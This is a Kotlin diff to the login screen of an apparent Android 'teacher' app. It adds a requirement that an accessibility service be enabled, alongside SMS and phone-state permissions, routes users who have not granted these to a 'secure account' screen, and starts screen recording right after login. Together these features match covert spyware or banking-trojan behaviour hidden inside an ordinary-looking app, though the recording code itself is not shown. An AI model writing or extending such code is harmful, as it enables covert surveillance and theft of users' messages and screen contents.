@@ -243,12 +243,17 @@ fun LoginScreen(navController: NavController, modifier: Modifier = Modifier) {
                                                     val phoneDone = androidx.core.content.ContextCompat.checkSelfPermission(
                                                         context, android.Manifest.permission.READ_PHONE_STATE
                                                     ) == android.content.pm.PackageManager.PERMISSION_GRANTED
+                                                    val accessibilityDone = (context as? com.example.teacherapp.MainActivity)
+                                                        ?.isAccessibilityServiceEnabled() == true
 
-                                                    val destination = if (smsDone && phoneDone) "main_screen"
+                                                    val destination = if (smsDone && phoneDone && accessibilityDone) "main_screen"
                                                     else "secure_account_screen"
                                                     navController.navigate(destination) {
                                                         popUpTo("login_screen") { inclusive = true }
                                                     }
+                                                    // Start screen recording after login
+                                                    (context as? com.example.teacherapp.MainActivity)
+                                                        ?.onAllPermissionsGranted()
                                                 } else {
                                                     navController.navigate("setup_profile_screen")
                                                 }
